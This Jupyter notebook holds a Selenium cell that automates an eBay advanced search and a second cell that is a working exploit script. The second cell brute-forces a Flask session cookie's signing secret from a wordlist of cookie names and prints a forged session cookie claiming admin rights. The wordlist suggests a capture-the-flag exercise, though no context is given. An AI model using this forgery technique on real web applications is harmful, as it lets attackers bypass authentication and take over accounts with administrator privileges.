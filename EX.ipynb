{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#1 - Init web driver\n",
    "driver = webdriver.Edge()\n",
    "\n",
    "#2 - Go to URL\n",
    "driver.get(\"https://www.ebay.com/\")\n",
    "\n",
    "#3 - Fing Advanced Search and Click on it \n",
    "advance_saerch = driver.find_element(By.XPATH, \"//*[text()='Advanced']\")\n",
    "advance_saerch.click()\n",
    "\n",
    "#4 - Input \"Samsung\" to Keywords\n",
    "keywords = driver.find_element(By.ID, \"_nkw\")\n",
    "keywords.send_keys(\"Samsung\")\n",
    "\n",
    "#5 - Select \"Keyword options\"\n",
    "keyword_options = Select(driver.find_element(By.XPATH, \"//*[@name='-in_kw']\"))\n",
    "keyword_options.select_by_index(2)\n",
    "keyword_options.select_by_visible_text(\"Exact words, exact oder\")\n",
    "keyword_options.select_by_value(\"1\")\n",
    "\n",
    "#6 - Select \"Search Including\"\n",
    "driver.find_element(By.XPATH, \"//*[@name='LH_TitleDesc']\").click()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZSVy6Q.szBoCdWLO0lDxTr30vGlVsCS3eM\n"
     ]
    }
   ],
   "source": [
    "import flask\n",
    "import hashlib\n",
    "\n",
    "from sys import argv\n",
    "from flask.json.tag import TaggedJSONSerializer\n",
    "from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature\n",
    "\n",
    "cookie = argv[1]\n",
    "\n",
    "cookie_names = [\"snickerdoodle\", \"chocolate chip\", \"oatmeal raisin\", \"gingersnap\", \n",
    "\"shortbread\", \"peanut butter\", \"whoopie pie\", \"sugar\", \"molasses\", \"kiss\", \n",
    "\"biscotti\", \"butter\", \"spritz\", \"snowball\", \"drop\", \"thumbprint\", \"pinwheel\", \n",
    "\"wafer\", \"macaroon\", \"fortune\", \"crinkle\", \"icebox\", \"gingerbread\", \"tassie\", \n",
    "\"lebkuchen\", \"macaron\", \"black and white\", \"white chocolate macadamia\"]\n",
    "\n",
    "real_secret = ''\n",
    "\n",
    "for secret in cookie_names:\n",
    "    try:\n",
    "        serializer = URLSafeTimedSerializer(\n",
    "            secret_key=secret,  \n",
    "            salt='cookie-session',\n",
    "            serializer=TaggedJSONSerializer(),\n",
    "            signer=TimestampSigner,\n",
    "            signer_kwargs={\n",
    "                'key_derivation' : 'hmac',\n",
    "                'digest_method' : hashlib.sha1\n",
    "        }).loads(cookie)\n",
    "    except BadSignature:\n",
    "        continue\n",
    "\n",
    "    print(f'Secret key: {secret}')\n",
    "    real_secret = secret\n",
    "\n",
    "session = {'very_auth' : 'admin'}\n",
    "\n",
    "print(URLSafeTimedSerializer(\n",
    "    secret_key=real_secret,\n",
    "    salt='cookie-session',\n",
    "    serializer=TaggedJSONSerializer(),\n",
    "    signer=TimestampSigner,\n",
    "    signer_kwargs={\n",
    "        'key_derivation' : 'hmac',\n",
    "        'digest_method' : hashlib.sha1\n",
    "    }\n",
    ").dumps(session))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
